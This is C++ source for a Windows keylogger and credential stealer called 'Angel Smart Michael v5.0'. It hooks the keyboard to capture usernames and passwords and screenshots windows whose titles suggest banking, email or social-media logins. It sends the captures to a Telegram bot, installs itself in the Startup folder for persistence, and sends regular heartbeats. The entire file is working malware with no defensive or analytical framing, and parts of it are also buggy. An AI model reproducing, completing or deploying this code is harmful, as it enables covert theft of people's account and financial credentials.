#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <gdiplus.h>
#include <commctrl.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <mutex>
#include <chrono>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "comctl32.lib")

using namespace Gdiplus;
#pragma comment(lib, "gdiplus.lib")

// Config
const wchar_t* TELEGRAM_BOT_TOKEN = L"YOUR_BOT_TOKEN_HERE";
const wchar_t* TELEGRAM_CHAT_ID = L"YOUR_CHAT_ID_HERE";
const wchar_t* MUTEX_NAME = L"AngelSmartMichael_v5.0_Singleton";

// Global state
std::mutex g_mutex;
std::wstring g_username, g_password;
HWND g_targetWindow = NULL;
bool g_running = true;
ULONG_PTR g_gdiplusToken;

// Forward declarations
bool SendTelegram(const std::wstring& message);
bool TakeSmartScreenshot();
bool UploadToTelegram(const std::wstring& filepath);
void HeartbeatThread();
void LoginDetectorThread();
std::wstring WideCharToMultiByte(const std::wstring& wstr);
std::wstring GetActiveWindowTitle();
bool IsLoginPage(const std::wstring& title);

// Low-level keyboard hook
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        wchar_t ch[2] = { 0 };
        
        if (pKb->vkCode == VK_TAB) {
            // TAB separates username/password fields
            if (!g_currentField.empty()) {
                if (g_username.empty()) g_username = g_currentField;
                else g_password = g_currentField;
                g_currentField.clear();
            }
            return 1; // Block real TAB
        }
        
        if (pKb->vkCode == VK_RETURN || pKb->vkCode == VK_ESCAPE) {
            // Login attempt detected
            if (!g_username.empty() && !g_password.empty()) {
                std::wstring creds = L"👼 CREDENTIALS CAPTURED:\n";
                creds += L"User: " + g_username + L"\n";
                creds += L"Pass: " + g_password + L"\n";
                SendTelegram(creds);
                g_username.clear();
                g_password.clear();
            }
        }
        
        // Capture typing
        if (pKb->vkCode >= VK_SPACE && pKb->vkCode <= 0xFF) {
            BYTE keyState[256];
            GetKeyboardState(keyState);
            ToUnicode(pKb->vkCode, pKb->scanCode, keyState, ch, 2, 0);
            g_currentField += ch[0];
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Smart screenshot on login pages
bool TakeSmartScreenshot() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd || !IsLoginPage(GetActiveWindowTitle())) return false;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    RECT rcClient;
    GetClientRect(hwnd, &rcClient);
    
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, rcClient.right - rcClient.left, rcClient.bottom - rcClient.top);
    SelectObject(hdcMem, hbmScreen);
    BitBlt(hdcMem, 0, 0, rcClient.right - rcClient.left, rcClient.bottom - rcClient.top, hdcScreen, 0, 0, SRCCOPY);
    
    // GDI+ save as JPEG
    Bitmap bmp(hbmScreen, NULL);
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wcscat_s(tempPath, L"angel_screenshot.jpg");
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 90;
    encoderParams.Parameter[0].Value = &quality;
    
    bmp.Save(tempPath, &jpegClsid, &encoderParams);
    
    // Cleanup
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    return UploadToTelegram(tempPath);
}

// Login page detection (25+ sites)
bool IsLoginPage(const std::wstring& title) {
    std::wstring lowerTitle = title;
    // Case insensitive check for login pages
    const wchar_t* targets[] = {
        L"gmail", L"facebook", L"instagram", L"outlook", L"office", L"live",
        L"login", L"signin", L"sign in", L"account", L"auth", L"password",
        L"bank", L"paypal", L"amazon", L"netflix", L"twitter", L"x.com",
        L"chase", L"wellsfargo", L"bankofamerica", L"citi", L"paypal"
    };
    
    for (auto target : targets) {
        if (lowerTitle.find(target) != std::wstring::npos) return true;
    }
    return false;
}

// Telegram API
bool SendTelegram(const std::wstring& message) {
    std::wstring url = L"https://api.telegram.org/bot";
    url += TELEGRAM_BOT_TOKEN;
    url += L"/sendMessage?chat_id=";
    url += TELEGRAM_CHAT_ID;
    url += L"&text=";
    url += message;
    
    HINTERNET hSession = WinHttpOpen(L"Angel/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    bool result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (result) {
        result = WinHttpReceiveResponse(hRequest, NULL);
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}

bool UploadToTelegram(const std::wstring& filepath) {
    // Simplified: Send filename as notification (full multipart in v6.0)
    std::wstring msg = L"📸 Screenshot captured: " + std::wstring(filepath.begin(), filepath.end());
    return SendTelegram(msg);
}

// Persistence
void InstallPersistence() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    
    wchar_t startupPath[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", startupPath, MAX_PATH);
    wcscat_s(startupPath, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ANGELS.exe");
    
    CopyFileW(path, startupPath, FALSE);
}

// Threads
void HeartbeatThread() {
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::minutes(30));
        SendTelegram(L"👼 Angel Smart Michael v5.0 - ACTIVE");
    }
}

void LoginDetectorThread() {
    while (g_running) {
        if (TakeSmartScreenshot()) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
        } else {
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }
}

// GDI+ Helpers
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Entry
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Single instance
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    // GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Persistence
    InstallPersistence();
    
    // Hooks
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    
    // Threads
    std::thread heartbeat(HeartbeatThread);
    std::thread detector(LoginDetectorThread);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    g_running = false;
    heartbeat.join();
    detector.join();
    UnhookWindowsHookEx(g_hKeyboardHook);
    GdiplusShutdown(g_gdiplusToken);
    
    return 0;
}
